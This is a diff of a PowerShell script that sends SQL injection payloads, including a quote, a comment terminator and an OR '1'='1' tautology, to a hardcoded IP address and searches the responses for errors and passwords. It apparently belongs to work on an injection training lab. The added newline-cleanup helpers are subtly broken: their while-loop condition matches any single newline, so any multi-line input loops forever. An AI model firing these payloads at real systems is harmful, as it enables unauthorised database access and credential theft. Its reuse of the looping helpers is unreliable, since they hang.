@@ -4,30 +4,63 @@
 
 $ip = "34.59.129.231"
 
+# function that replaces multiple newlines with a single newline
+function Replace-MultipleNewlines {
+    param (
+        [string]$inputString
+    )
+    
+    # while MultipleNewlines exists
+    while ($inputString -match '\r?\n+') {
+        $inputString = $inputString -replace '\r?\n+', "`n"
+    }
+    
+    $inputString
+}
+
+
+# Trim and replace multiple newlines with a single newline
+function Better-Trim {
+    param (
+        [string]$inputString
+    )
+    
+    # while MultipleNewlines exists
+    while ($inputString -match '\r?\n+') {
+        $inputString = $inputString -replace '\r?\n+', "`n"
+    }
+    
+    $inputString.Trim()
+}
+
 # ============================================================================
 # Less-1: Error-Based String Injection
 # ============================================================================
 
 # Normal Request
-(iwr "http://$ip/Less-1/?id=1").Content.Trim() | Select-String -Pattern 'password'
+$payload="1"
+Better-Trim ((iwr "http://$ip/Less-1/?id=$payload").Content) | Select-String -Pattern 'password'
 
 # Test for Vulnerability
 
 # Single quote causes SQL error
-iwr "http://$ip/Less-1/?id=1'"
+$payload="1'"
+(iwr "http://$ip/Less-1/?id=$payload").Content.Trim() | Select-String -Pattern 'error'
 
 # Confirm with comment
-iwr "http://$ip/Less-1/?id=1'--"
+$payload="1'--"
+(iwr "http://$ip/Less-1/?id=$payload").Content.Trim() | Select-String -Pattern 'error'
 
-# Extract data
-iwr "http://$ip/Less-1/?id=1' OR '1'='1"
+# Extract data or test if we can successfully run a SQL command
+$payload="1' OR '1'='1"
+(iwr "http://$ip/Less-1/?id=$payload").Content.Trim() | Select-String -Pattern 'password'
 
 # ============================================================================
 # Less-2: Error-Based Numeric Injection
 # ============================================================================
 
 # Normal Request
-iwr "http://$ip/Less-2/?id=1"
+(iwr "http://$ip/Less-2/?id=1").Content.Trim()
 
 # Test for Vulnerability
 
